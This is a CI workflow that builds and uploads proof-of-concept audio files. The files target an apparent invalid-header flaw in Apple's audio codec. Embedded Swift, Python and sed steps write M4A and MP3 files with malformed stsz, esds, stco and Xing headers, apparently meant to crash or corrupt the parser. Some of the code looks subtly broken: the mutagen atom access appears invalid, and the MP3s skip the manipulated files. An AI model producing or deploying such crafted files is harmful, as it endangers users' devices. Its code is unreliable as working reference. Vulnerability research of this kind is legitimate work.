name: Generate PoC Audio Files

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build-and-generate:
    runs-on: macos-latest
    timeout-minutes: 30

    steps:
      # Clone the repository
      - name: Clone repository
        run: |
          echo "Cloning repository at $(date)"
          git clone https://github.com/encryptedcoderr/AppleTest/
          cd AppleTest/apple-positional-audio-codec-invalid-header-main
          echo "Listing directory contents at $(date)"
          ls -l
          echo "Repository cloned and directory listed at $(date)"

      # Cache FFmpeg
      - name: Cache FFmpeg
        uses: actions/cache@v4
        with:
          path: /usr/local/bin/ffmpeg
          key: ffmpeg-${{ runner.os }}-2025-06
          restore-keys: ffmpeg-${{ runner.os }}-

      # Install FFmpeg and Python dependencies
      - name: Install FFmpeg and Python dependencies
        run: |
          echo "Installing FFmpeg and Python dependencies at $(date)"
          if ! command -v ffmpeg &> /dev/null; then
            brew install ffmpeg
          else
            echo "FFmpeg already installed"
          fi
          pip3 install mutagen
          echo "FFmpeg and Python dependencies installed at $(date)"

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '16.1'

      # Create generate_pocs.swift
      - name: Create generate_pocs.swift
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating generate_pocs.swift at $(date)"
          cat << 'EOF' > generate_pocs.swift
          import AVFoundation
          import Foundation
          import CoreMedia

          func generateBaseM4A(filename: String, duration: Double, channels: Int, sampleRate: Double) throws {
              let outputURL = URL(fileURLWithPath: filename)
              let format = AVAudioFormat(standardFormatWithSampleRate: sampleRate, channels: UInt32(channels))!
              let frameCount = UInt32(duration * sampleRate)
              let buffer = AVAudioPCMBuffer(pcmFormat: format, frameCapacity: frameCount)!
              buffer.frameLength = frameCount
              if let floatData = buffer.floatChannelData {
                  for channel in 0..<Int(format.channelCount) {
                      memset(floatData[channel], 0, Int(frameCount) * MemoryLayout<Float>.size)
                  }
              }
              let writer = try AVAssetWriter(outputURL: outputURL, fileType: .m4a)
              let settings: [String: Any] = [
                  AVFormatIDKey: kAudioFormatMPEG4AAC,
                  AVSampleRateKey: sampleRate,
                  AVNumberOfChannelsKey: channels,
                  AVEncoderBitRateKey: 128000
              ]
              let audioInput = AVAssetWriterInput(mediaType: .audio, outputSettings: settings)
              writer.add(audioInput)
              writer.startWriting()
              writer.startSession(atSourceTime: .zero)
              var formatDesc: CMAudioFormatDescription?
              let asbd = format.streamDescription
              CMAudioFormatDescriptionCreate(allocator: kCFAllocatorDefault,
                                            asbd: asbd,
                                            layoutSize: 0,
                                            layout: nil,
                                            magicCookieSize: 0,
                                            magicCookie: nil,
                                            extensions: nil,
                                            formatDescriptionOut: &formatDesc)
              var sampleBuffer: CMSampleBuffer?
              let blockBufferLength = Int(frameCount) * Int(format.channelCount) * MemoryLayout<Float>.size
              var blockBuffer: CMBlockBuffer?
              CMBlockBufferCreateWithMemoryBlock(allocator: kCFAllocatorDefault,
                                                memoryBlock: buffer.floatChannelData![0],
                                                blockLength: blockBufferLength,
                                                blockAllocator: kCFAllocatorNull,
                                                customBlockSource: nil,
                                                offsetToData: 0,
                                                dataLength: blockBufferLength,
                                                flags: 0,
                                                blockBufferOut: &blockBuffer)
              let timing = CMSampleTimingInfo(duration: CMTime(value: 1, timescale: Int32(sampleRate)),
                                             presentationTimeStamp: .zero,
                                             decodeTimeStamp: .invalid)
              CMSampleBufferCreate(allocator: kCFAllocatorDefault,
                                  dataBuffer: blockBuffer,
                                  dataReady: true,
                                  makeDataReadyCallback: nil,
                                  refcon: nil,
                                  formatDescription: formatDesc,
                                  sampleCount: CMItemCount(frameCount),
                                  sampleTimingEntryCount: 1,
                                  sampleTimingArray: [timing],
                                  sampleSizeEntryCount: 0,
                                  sampleSizeArray: nil,
                                  sampleBufferOut: &sampleBuffer)
              audioInput.append(sampleBuffer!)
              audioInput.markAsFinished()
              writer.finishWriting {
                  print("Generated \(filename)")
              }
              while writer.status == .writing {
                  Thread.sleep(forTimeInterval: 0.1)
              }
              if writer.status == .failed {
                  throw writer.error ?? NSError(domain: "AVAssetWriter", code: -1, userInfo: nil)
              }
          }

          func main() {
              let sampleRate = 44100.0
              let duration = 1.0
              let channels = 2
              for i in 1...5 {
                  let filename = "base_poc\(i).m4a"
                  do {
                      try generateBaseM4A(filename: filename, duration: duration, channels: channels, sampleRate: sampleRate)
                  } catch {
                      print("Error generating \(filename): \(error)")
                      exit(1)
                  }
              }
          }

          main()
          EOF
          ls -l generate_pocs.swift
          echo "generate_pocs.swift created at $(date)"

      # Create manipulate_pocs.py
      - name: Create manipulate_pocs.py
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating manipulate_pocs.py at $(date)"
          cat << 'EOF' > manipulate_pocs.py
          from mutagen.mp4 import MP4, MP4StreamInfoError
          import os
          import subprocess

          def manipulate_poc1(input_file, output_m4a):
              try:
                  mp4 = MP4(input_file)
                  if 'moov' in mp4 and 'trak' in mp4['moov'] and 'mdia' in mp4['moov']['trak'][0]:
                      stsz = mp4['moov']['trak'][0]['mdia']['minf']['stbl']['stsz']
                      stsz['sample_count'] = 8192
                      mp4.save(output_m4a)
                      print(f"PoC 1: Set stsz sample count to 8192 in {output_m4a}")
                  else:
                      raise ValueError("Invalid MP4 structure for PoC 1")
              except Exception as e:
                  print(f"PoC 1 M4A error: {e}")
                  raise

          def manipulate_poc2(input_file, output_m4a):
              try:
                  mp4 = MP4(input_file)
                  if 'moov' in mp4 and 'trak' in mp4['moov'] and 'mdia' in mp4['moov']['trak'][0]:
                      esds = mp4['moov']['trak'][0]['mdia']['minf']['stbl']['stsd']['mp4a'][0]['esds']
                      esds_data = bytearray(esds['esds'])
                      esds_data[0x1B] = 8
                      esds['esds'] = bytes(esds_data)
                      mp4.save(output_m4a)
                      print(f"PoC 2: Set esds channel count to 8 in {output_m4a}")
                  else:
                      raise ValueError("Invalid MP4 structure for PoC 2")
              except Exception as e:
                  print(f"PoC 2 M4A error: {e}")
                  raise

          def manipulate_poc5(input_file, output_m4a):
              try:
                  mp4 = MP4(input_file)
                  if 'moov' in mp4 and 'trak' in mp4['moov'] and 'mdia' in mp4['moov']['trak'][0]:
                      stco = mp4['moov']['trak'][0]['mdia']['minf']['stbl']['stco']
                      stco['entry_list'] = [[0xFFFFFFFF]]
                      mp4.save(output_m4a)
                      print(f"PoC 5: Set invalid stco offset in {output_m4a}")
                  else:
                      raise ValueError("Invalid MP4 structure for PoC 5")
              except Exception as e:
                  print(f"PoC 5 M4A error: {e}")
                  raise

          def generate_mp3(input_file, output_mp3, poc_number):
              try:
                  cmd = ["ffmpeg", "-i", input_file, "-c:a", "mp3", "-ac", "1"]
                  if poc_number == 3:
                      cmd.extend(["-b:a", "128k", "-metadata", "frames=20000"])
                      print(f"PoC 3: Generating {output_mp3} with Xing frames=20000")
                  elif poc_number == 4:
                      cmd.extend(["-b:a", "320k"])
                      print(f"PoC 4: Generating {output_mp3} with 320 kbps bitrate")
                  else:
                      cmd.extend(["-b:a", "128k"])
                      print(f"PoC {poc_number}: Generating {output_mp3} with default settings")
                  cmd.append(output_mp3)
                  result = subprocess.run(cmd, capture_output=True, text=True)
                  if result.returncode != 0:
                      raise RuntimeError(f"FFmpeg error: {result.stderr}")
              except Exception as e:
                  print(f"PoC {poc_number} MP3 error: {e}")
                  raise

          def main():
              for i in range(1, 6):
                  input_file = f"base_poc{i}.m4a"
                  output_m4a = f"poc{i}.m4a"
                  output_mp3 = f"poc{i}.mp3"
                  if not os.path.exists(input_file):
                      print(f"Error: {input_file} not found")
                      exit(1)
                  if i == 1:
                      manipulate_poc1(input_file, output_m4a)
                  elif i == 2:
                      manipulate_poc2(input_file, output_m4a)
                  elif i == 3 or i == 4:
                      os.system(f"cp {input_file} {output_m4a}")
                      print(f"Copied {input_file} to {output_m4a} for PoC {i}")
                  elif i == 5:
                      manipulate_poc5(input_file, output_m4a)
                  generate_mp3(input_file, output_mp3, i)

          if __name__ == "__main__":
              main()
          EOF
          ls -l manipulate_pocs.py
          echo "manipulate_pocs.py created at $(date)"

      # Create PoC source files
      - name: Create PoC source files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating PoC source files at $(date)"
          # PoC 1: Inflated Sample Count in stsz
          cp encodeme.mm encodeme_poc1.mm
          sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/8192/' encodeme_poc1.mm
          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float))/ s/44100 * channelNum * sizeof(float)/1024 * channelNum * sizeof(float)/' encodeme_poc1.mm
          
          # PoC 2: esds Channel Configuration Mismatch
          cp encodeme.mm encodeme_poc2.mm
          sed -i '' '/mChannelsPerFrame = channelNum/ s/channelNum/8/' encodeme_poc2.mm
          sed -i '' '/mNumberChannels = channelNum/ s/channelNum/1/' encodeme_poc2.mm
          sed -i '' '/kAudioChannelLayoutTag_Stereo/ s/Stereo/HOA_ACN_SN3D | 0x8/' encodeme_poc2.mm
          
          # PoC 3: Xing Header Frame Count Inflation
          cp encodeme.mm encodeme_poc3.mm
          sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/2000/' encodeme_poc3.mm
          
          # PoC 4: Frame Header Bitrate Mismatch
          cp encodeme.mm encodeme_poc4.mm
          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float))/ s/44100 * channelNum * sizeof(float)/(144000 \/ 1000 * 64 * channelNum)/' encodeme_poc4.mm
          
          # PoC 5: stco Offset Overflow
          cp encodeme.mm encodeme_poc5.mm
          sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/4096/' encodeme_poc5.mm
          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float))/ s/44100 * channelNum * sizeof(float)/100/' encodeme_poc5.mm
          
          ls -l encodeme_poc*.mm
          echo "PoC source files created at $(date)"

      # Generate base M4A files
      - name: Generate base M4A files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Generating base M4A files at $(date)"
          swift generate_pocs.swift
          ls -l base_poc*.m4a
          echo "Base M4A files generated at $(date)"

      # Manipulate M4A and generate MP3 files
      - name: Manipulate M4A and generate MP3 files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Manipulating M4A and generating MP3 files at $(date)"
          python3 manipulate_pocs.py
          ls -l poc*.m4a poc*.mp3
          echo "M4A and MP3 files generated at $(date)"

      # Verify generated files
      - name: Verify generated files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Checking for generated files at $(date)"
          for poc in {1..5}; do
            for ext in m4a mp3; do
              if [ -f poc${poc}.${ext} ]; then
                FILE_SIZE=$(stat -f %z poc${poc}.${ext} 2>/dev/null || stat -c %s poc${poc}.${ext} 2>/dev/null)
                echo "poc${poc}.${ext} size: $FILE_SIZE bytes"
                if [ "$FILE_SIZE" -eq 0 ]; then
                  echo "Error: poc${poc}.${ext} is 0 bytes"
                  exit 1
                fi
                ffprobe -i poc${poc}.${ext} -show_format -show_streams -print_format json 2>/dev/null || echo "ffprobe failed for poc${poc}.${ext}"
              else
                echo "poc${poc}.${ext} not found"
                exit 1
              fi
            done
          done
          echo "Generated files verified at $(date)"

      # Upload artifacts
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: poc-audio-files
          path: |
            AppleTest/apple-positional-audio-codec-invalid-header-main/poc*.m4a
            AppleTest/apple-positional-audio-codec-invalid-header-main/poc*.mp3
            AppleTest/apple-positional-audio-codec-invalid-header-main/encodeme_poc*.mm
          retention-days: 7
          if-no-files-found: error
